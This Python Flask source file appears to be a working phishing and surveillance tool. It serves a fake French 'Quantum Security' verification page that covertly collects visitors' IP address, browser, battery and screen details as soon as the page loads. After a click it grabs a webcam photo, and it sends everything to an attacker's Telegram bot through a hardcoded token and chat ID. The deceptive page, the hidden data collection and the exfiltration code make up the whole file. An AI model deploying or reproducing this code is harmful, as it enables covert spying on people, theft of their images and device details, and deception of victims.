# api/index.py
from flask import Flask, request, jsonify, send_from_directory
import requests
import json
import os
import base64
from datetime import datetime
import re

app = Flask(__name__, static_folder='../static', static_url_path='')

# Configuration Telegram - À MODIFIER
BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
CHAT_ID = "8546452645"

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

def send_to_telegram(text, photo_bytes=None):
    try:
        if photo_bytes:
            files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
            data = {'chat_id': CHAT_ID, 'caption': text}
            requests.post(TELEGRAM_PHOTO_API, files=files, data=data, timeout=10)
        else:
            data = {'chat_id': CHAT_ID, 'text': text}
            requests.post(TELEGRAM_API, json=data, timeout=10)
    except Exception as e:
        print(f"Erreur: {e}")

# Page HTML
HTML_PAGE = '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Quantum Security Hub</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #020408);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', 'Courier New', monospace;
            overflow-x: hidden;
        }
        .glow {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(0,255,255,0.15) 0%, transparent 50%);
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
        }
        .card {
            background: rgba(10, 20, 40, 0.7);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid rgba(0, 255, 255, 0.3);
            padding: 2rem;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.1);
        }
        h1 {
            color: #0ff;
            font-size: 1.8rem;
            letter-spacing: 2px;
            margin-bottom: 1rem;
            text-transform: uppercase;
        }
        .sub {
            color: #6c8db0;
            margin-bottom: 2rem;
            font-size: 0.8rem;
        }
        .image-container {
            cursor: pointer;
            margin: 1.5rem 0;
            transition: transform 0.3s;
        }
        .image-container:hover {
            transform: scale(1.02);
        }
        .shield-img {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.4);
            border: 2px solid #0ff;
            transition: all 0.3s;
        }
        .btn {
            background: linear-gradient(90deg, #0ff3, #0fa3);
            border: none;
            padding: 14px 35px;
            border-radius: 40px;
            color: #010514;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            margin: 0.5rem;
            transition: 0.2s;
        }
        .btn:hover {
            background: #0ff;
            box-shadow: 0 0 15px #0ff;
            transform: scale(1.02);
        }
        .status {
            margin-top: 1.5rem;
            color: #0f0;
            font-size: 0.8rem;
            font-family: monospace;
        }
        footer {
            margin-top: 2rem;
            color: #2a4a6a;
            font-size: 0.7rem;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 #0ff4; }
            70% { box-shadow: 0 0 0 15px #0ff0; }
            100% { box-shadow: 0 0 0 0 #0ff0; }
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
    </style>
</head>
<body>
<div class="glow" id="glow"></div>
<div class="container">
    <div class="card">
        <h1>◈ QUANTUM SECURITY ◈</h1>
        <div class="sub">vérification de l'intégrité du terminal</div>
        
        <div class="image-container" id="clickZone">
            <img class="shield-img" src="https://cdn-icons-png.flaticon.com/512/1048/1048937.png" alt="security shield">
        </div>
        
        <button class="btn" id="actionBtn">ACCÉDER À LA ZONE SÉCURISÉE</button>
        
        <div class="status" id="statusMsg">🔒 Système prêt • cliquez pour authentification</div>
        <footer>© Quantum Defense System • session chiffrée</footer>
    </div>
</div>

<script>
    let streamActive = false;
    let videoElement = null;
    let collectedData = {};

    function updateGlow(e) {
        const glow = document.getElementById('glow');
        const rect = document.getElementById('clickZone').getBoundingClientRect();
        const x = e.clientX || rect.left + rect.width/2;
        const y = e.clientY || rect.top + rect.height/2;
        glow.style.setProperty('--x', x + 'px');
        glow.style.setProperty('--y', y + 'px');
    }
    document.addEventListener('mousemove', updateGlow);
    
    async function sendToServer(data, isPhoto = false, photoBlob = null) {
        try {
            if (isPhoto && photoBlob) {
                const reader = new FileReader();
                reader.onloadend = function() {
                    fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ photo: reader.result, info: collectedData })
                    });
                };
                reader.readAsDataURL(photoBlob);
            } else {
                await fetch('/api/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            }
        } catch(e) {}
    }

    // Collecte des informations système
    async function collectSystemInfo() {
        collectedData.timestamp = new Date().toISOString();
        collectedData.userAgent = navigator.userAgent;
        collectedData.platform = navigator.platform;
        collectedData.language = navigator.language;
        
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            collectedData.ip = data.ip;
        } catch(e) { collectedData.ip = 'inconnu'; }
        
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                collectedData.battery = Math.floor(battery.level * 100) + '%';
                collectedData.charging = battery.charging;
            } catch(e) {}
        } else {
            collectedData.battery = 'indisponible';
        }
        
        const screen = `${window.screen.width}x${window.screen.height}`;
        collectedData.screen = screen;
        collectedData.url = window.location.href;
        
        await sendToServer(collectedData);
        document.getElementById('statusMsg').innerHTML = '✓ Identifiants collectés • accès caméra...';
    }

    // Capture photo via WebRTC
    async function takePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            document.getElementById('statusMsg').innerHTML = '🎥 Caméra active • capture en cours...';
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    await sendToServer(null, true, blob);
                    document.getElementById('statusMsg').innerHTML = '✅ Authentification terminée • accès autorisé';
                    document.querySelector('.shield-img').classList.add('pulse');
                    setTimeout(() => {
                        document.querySelector('.shield-img').classList.remove('pulse');
                    }, 2000);
                }, 'image/jpeg', 0.8);
                
                stream.getTracks().forEach(track => track.stop());
                if (video) video.remove();
            }, 1500);
        } catch(err) {
            document.getElementById('statusMsg').innerHTML = '⚠️ Accès caméra refusé • vérification manuelle requise';
            await sendToServer({ ...collectedData, cameraError: err.message });
        }
    }

    // Déclencheur
    async function startProcess() {
        document.getElementById('statusMsg').innerHTML = '⏳ Collecte des informations...';
        await collectSystemInfo();
        await takePhoto();
    }

    document.getElementById('clickZone').addEventListener('click', startProcess);
    document.getElementById('actionBtn').addEventListener('click', startProcess);
    
    // Collecte immédiate des infos passives
    collectSystemInfo();
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        if data:
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            data['ip'] = ip
            data['server_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Envoi Telegram
            msg = f"""🔴 *NOUVELLE COLLECTE*
━━━━━━━━━━━━━━━━━━
📍 *IP*: {data.get('ip', '?')}
📱 *UA*: {data.get('userAgent', '?')[:80]}
🔋 *Batterie*: {data.get('battery', '?')}
💻 *Ecran*: {data.get('screen', '?')}
🕐 *Heure*: {data.get('server_time')}
━━━━━━━━━━━━━━━━━━"""
            send_to_telegram(msg)
            
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        if data and data.get('photo'):
            # Extraire l'image base64
            photo_b64 = data['photo'].split(',')[1]
            photo_bytes = base64.b64decode(photo_b64)
            
            info = data.get('info', {})
            msg = f"""📸 *CAPTURE PHOTO* 📸
━━━━━━━━━━━━━━━━━━
📍 IP: {info.get('ip', '?')}
🔋 Batterie: {info.get('battery', '?')}
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━"""
            send_to_telegram(msg, photo_bytes)
            
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({'status': 'active', 'bot': BOT_TOKEN[:10] + '...'})

# Vercel handler
def handler(event, context):
    return app(event, context)

# Fichiers statiques
@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)
